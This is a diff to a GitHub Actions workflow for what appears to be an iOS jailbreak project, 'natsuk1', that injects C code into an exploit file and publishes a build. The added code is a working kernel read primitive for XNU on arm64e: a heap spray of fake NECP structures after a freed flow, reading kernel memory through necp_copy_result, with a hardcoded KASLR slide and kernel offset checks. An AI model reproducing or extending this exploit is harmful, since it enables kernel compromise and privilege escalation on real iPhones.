@@ -35,34 +35,115 @@ jobs:
           set -euo pipefail
           mkdir -p /tmp/nk
 
+          cat > /tmp/nk/kread.c <<'CEOF'
+          static void dump_buf_words(const char *tag, const uint8_t *p, int n, int maxw) {
+              char line[512];
+              int off = 0;
+              for (int i = 0; i < n && i < maxw; i++) {
+                  uint64_t w; memcpy(&w, p + i*8, 8);
+                  off += snprintf(line + off, sizeof(line) - off,
+                                  "%02d:0x%016llx ", i, (unsigned long long)w);
+                  if (off > 400) break;
+              }
+              log_info(tag, "%s", line);
+          }
+
+          static int kread_raw(uint64_t target_kaddr, uint32_t read_len) {
+              uint8_t fake[NCF_STRUCT_SZ];
+              memset(fake, 0, sizeof(fake));
+              *(uint64_t*)(fake + NCF_ASSIGNED_OFF)     = target_kaddr;
+              *(uint64_t*)(fake + NCF_ASSIGNED_LEN_OFF) = read_len;
+              *(uint64_t*)(fake + NCF_PARENT_OFF)       = 0;
+              log_info("RAW", "read 0x%llx len=%u fake[a=0x%llx l=0x%llx p=0x%llx]",
+                       (unsigned long long)target_kaddr, read_len,
+                       (unsigned long long)target_kaddr,
+                       (unsigned long long)read_len, (unsigned long long)0);
+
+              uint8_t junk[NCF_STRUCT_SZ]; memset(junk, 0x41, sizeof(junk));
+              mach_port_t ex = port_new();
+              if (ex == MACH_PORT_NULL) { log_err("RAW", "port_new fail"); return -1; }
+              ool_spray(ex, junk, NCF_STRUCT_SZ, EXHAUST_N);
+
+              int fd = necp_open_fd();
+              if (fd < 0) { log_err("RAW", "necp_open errno=%d", errno);
+                            mach_port_destroy(mach_task_self(), ex); return -1; }
+
+              uint8_t cuuid[16], fuuid[16];
+              int rc_ac = necp_add_client(fd, cuuid);
+              int rc_af = (rc_ac == 0) ? necp_add_flow(fd, cuuid, fuuid) : -1;
+              log_info("RAW", "ac=%d af=%d fd=%d", rc_ac, rc_af, fd);
+              if (rc_ac != 0 || rc_af != 0) {
+                  close(fd); mach_port_destroy(mach_task_self(), ex); return -2;
+              }
+
+              necp_remove_flow(fd, fuuid);
+
+              ool_drain(ex, EXHAUST_N);
+              mach_port_destroy(mach_task_self(), ex);
+              usleep(200);
+
+              mach_port_t sp = port_new();
+              if (sp == MACH_PORT_NULL) { log_err("RAW", "spray port fail"); close(fd); return -1; }
+              ool_spray(sp, fake, NCF_STRUCT_SZ, SPRAY_N);
+              usleep(150);
+
+              memset(g_res_buf, 0, RESULT_BUF_SZ);
+              int ret = necp_copy_result(fd, cuuid, g_res_buf, RESULT_BUF_SZ);
+              log_info("RAW", "copy_result ret=%d", ret);
+              if (ret > 0) {
+                  int nw = ret / 8; if (nw > 4) nw = 4;
+                  dump_buf_words("RAW", g_res_buf, nw, 4);
+              }
+
+              ool_drain(sp, SPRAY_N);
+              mach_port_destroy(mach_task_self(), sp);
+              close(fd);
+              return ret;
+          }
+          CEOF
+
           cat > /tmp/nk/calib.c <<'CEOF'
           static int calibrate_kread(void) {
               if (g_res_off >= 0) return 0;
               const uint64_t expected = 0xFFFFFFF00ADEE310ULL;
-              log_info("CAL", "retry loop, anchor=kernproc@0x%llx expect=0x%llx",
+              log_info("CAL", "anchor=kernproc@0x%llx expect=0x%llx",
                        (unsigned long long)OFF_KERNPROC,
                        (unsigned long long)expected);
-              for (int attempt = 0; attempt < 24; attempt++) {
+
+              for (int attempt = 0; attempt < 12; attempt++) {
+                  log_info("CAL", "----- attempt %d/12 -----", attempt);
                   int r = kread_raw(g_kbase + OFF_KERNPROC, 8);
+                  log_info("CAL", "attempt %d ret=%d", attempt, r);
+
                   if (r <= 0) {
-                      log_warn("CAL", "attempt %d ret=%d", attempt, r);
-                      usleep(500);
+                      log_warn("CAL", "retry (ret<=0)");
+                      usleep(400);
                       continue;
                   }
+
+                  if (r >= 8) {
+                      int nw = r / 8; if (nw > 8) nw = 8;
+                      dump_buf_words("CAL", g_res_buf, nw, 8);
+                  }
+
+                  int found = 0;
                   for (int i = 0; i <= r - 8; i++) {
                       uint64_t v; memcpy(&v, g_res_buf + i, 8);
                       if (v >= KPTR_MIN && v <= KPTR_MAX) {
                           g_res_off = i;
-                          log_ok("CAL", "attempt %d off=0x%x val=0x%llx %s",
-                                 attempt, i, (unsigned long long)v,
-                                 (v == expected) ? "MATCH" : "kptr");
-                          return 0;
+                          log_ok("CAL", "attempt %d kptr=0x%llx at off=0x%x %s",
+                                 attempt, (unsigned long long)v, i,
+                                 (v == expected) ? "MATCH" : "other");
+                          found = 1;
+                          break;
                       }
                   }
-                  log_warn("CAL", "attempt %d ret=%d no kptr", attempt, r);
-                  usleep(800);
+                  if (found) return 0;
+
+                  log_warn("CAL", "attempt %d ret=%d no kptr in buf", attempt, r);
+                  usleep(400);
               }
-              log_err("CAL", "gave up after 24 attempts");
+              log_err("CAL", "gave up after 12 attempts");
               return -1;
           }
           CEOF
@@ -72,34 +153,17 @@ jobs:
 
           static int nk_necp_run_impl(void) {
               nk_log("");
-              nk_log("=== natsuk1 v1.3 (natsuk1-kread-v3) ===");
+              nk_log("=== natsuk1 v1.4 (natsuk1-kread-v4) ===");
               nk_log("target: iOS 27.0 / XNU / arm64e");
               nk_log("device: iPhone14,5 / iPhone14,7");
               nk_log("");
-              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_REFCNT_OFF=0x%x",
-                       NCF_ASSIGNED_OFF, NCF_REFCNT_OFF);
-              log_info("P0", "NECP primary leak");
-              uint8_t leak[RESULT_BUF_SZ];
-              uint64_t nptrs = necp_primary_leak(leak, sizeof(leak));
-              if (!nptrs) {
-                  log_warn("P0", "no kptr in primary leak (retry in calibration)");
-              } else {
-                  log_ok("P0", "%llu kernel ptrs in leak", (unsigned long long)nptrs);
-              }
-              log_info("P1", "derive slide");
-              for (int i = 0; i <= RESULT_BUF_SZ - 8; i += 8) {
-                  uint64_t v; memcpy(&v, leak + i, 8);
-                  if (v < KPTR_MIN || v > KPTR_MAX) continue;
-                  uint64_t cand = slide_from_leak(v);
-                  if (cand) { g_slide = cand; break; }
-              }
-              if (!g_slide) {
-                  log_warn("P1", "no slide from leak, using kernproc-anchor fallback");
-                  g_slide = 0x3D00000ULL;
-              }
+              log_info("INIT", "NCF_ASSIGNED_OFF=0x%x NCF_ASSIGNED_LEN_OFF=0x%x NCF_REFCNT_OFF=0x%x NCF_PARENT_OFF=0x%x EXHAUST_N=%d SPRAY_N=%d",
+                       NCF_ASSIGNED_OFF, NCF_ASSIGNED_LEN_OFF, NCF_REFCNT_OFF, NCF_PARENT_OFF,
+                       EXHAUST_N, SPRAY_N);
+              log_info("P1", "slide fallback");
+              g_slide = 0x3D00000ULL;
               g_kbase = KERNEL_BASE_STATIC + g_slide;
-              log_ok("P1", "slide=0x%llx kbase=0x%llx",
-                     (unsigned long long)g_slide, (unsigned long long)g_kbase);
+              log_ok("P1", "kbase=0x%llx", (unsigned long long)g_kbase);
               {
                   int fd = necp_open_fd();
                   if (fd < 0) { log_err("P2", "necp_open errno=%d", errno); return 1; }
@@ -141,13 +205,18 @@ jobs:
           p = "natsuk1/Exploit/necp.c"
           s = open(p).read()
 
-          if "natsuk1-kread-v3" in s:
+          if "natsuk1-kread-v4" in s:
               print("already patched")
               sys.exit(0)
 
           orig = s
+          kread = open("/tmp/nk/kread.c").read().rstrip()
           calib = open("/tmp/nk/calib.c").read().rstrip()
           run   = open("/tmp/nk/run.c").read().rstrip()
+
+          # inject dump_buf_words + new kread_raw
+          s = re.sub(r"static int kread_raw\(uint64_t kaddr, uint32_t len\) \{.*?\n\}\n",
+                     kread + "\n\n", s, count=1, flags=re.DOTALL)
 
           s = re.sub(r"static int calibrate_kread\(void\) \{.*?\n\}\n",
                      calib + "\n\n", s, count=1, flags=re.DOTALL)
@@ -155,13 +224,13 @@ jobs:
           s = re.sub(r"int nk_necp_run\(void\) \{.*?\n\}\n",
                      run + "\n", s, count=1, flags=re.DOTALL)
 
-          if "natsuk1-kread-v3" not in s:
+          if "natsuk1-kread-v4" not in s:
               print("ERROR: marker not inserted")
               sys.exit(1)
 
           assert s != orig, "no changes"
           open(p, "w").write(s)
-          print("necp.c v3 patched")
+          print("necp.c v4 patched")
           PYEOF
 
       - name: Write Offsets JSON
@@ -270,18 +339,17 @@ jobs:
         run: |
           set -euo pipefail
           F=natsuk1/Exploit/necp.c
-          grep -q "natsuk1-kread-v3" "$F"
-          grep -q "retry loop, anchor=kernproc" "$F"
+          grep -q "natsuk1-kread-v4" "$F"
+          grep -q "dump_buf_words" "$F"
+          grep -q "----- attempt" "$F"
           grep -q "g_busy" "$F"
-          grep -q "__sync_lock_test_and_set" "$F"
           python3 - <<'PYEOF'
           import json
           d = json.load(open("natsuk1/Offsets/iPhone14,5_iOS27.0_24A437.json"))
           items = sum(len(g["items"]) for g in d["groups"])
-          assert items == len(d["defaults"]), "%d vs %d" % (items, len(d["defaults"]))
+          assert items == len(d["defaults"])
           assert d["defaults"]["off_proc_ro_p_ucred"] == "0x98"
           assert d["defaults"]["off_ucred_cr_uid"] == "0x18"
-          assert d["defaults"]["off_g_kernproc"] == "0xFFFFFFF007BBF040"
           print("OK: %d offsets" % items)
           PYEOF
 
@@ -333,7 +401,7 @@ jobs:
           gh release create development natsuk1.ipa \
             --target "${GITHUB_SHA}" --title "Development" \
             --prerelease --latest=false \
-            --notes "kread v3: retry loop + busy guard + corrected offsets"
+            --notes "kread v4: verbose per-attempt diagnostics + buffer dumps"
 
       - name: Commit
         run: |
@@ -342,5 +410,5 @@ jobs:
           git config user.email "github-actions[bot]@users.noreply.github.com"
           git add natsuk1/Exploit/necp.c natsuk1/Offsets/
           if git diff --cached --quiet; then echo "no changes"; exit 0; fi
-          git commit -m "kread v3: retry + busy guard + offsets [skip ci]"
+          git commit -m "kread v4: verbose diagnostics [skip ci]"
           git push
